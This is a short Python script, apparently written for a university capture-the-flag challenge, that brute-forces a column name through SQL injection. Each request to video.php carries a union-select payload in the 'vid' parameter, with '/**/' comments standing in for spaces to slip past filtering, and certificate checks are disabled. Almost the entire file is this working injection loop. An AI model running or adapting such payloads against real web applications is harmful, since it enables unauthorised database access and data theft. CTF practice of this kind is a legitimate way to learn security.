# importing the requests library 

import requests 
  
# api-endpoint 
colName = []

while True:
    wrapped = True
    for i in range(0, len(colName)):

        colName[i] = (colName[i] + 1) % 94 + 33

        if colName[i] != 33:
            wrapped = False
            break

    if wrapped:
        colName.append(33)

    URL = "https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1," + ''.join([chr(x) for x in colName]) + ",null/**/from/**/dual"

    r = requests.get(url = URL, verify=False) 
      
# data = r.status_code
    output = r.text.splitlines()[-1]

    print("\n" + URL)
# print(data)
    print(output + "\n")

    if (not "Error" in output) and (not "Bad cat!" in output):
        break

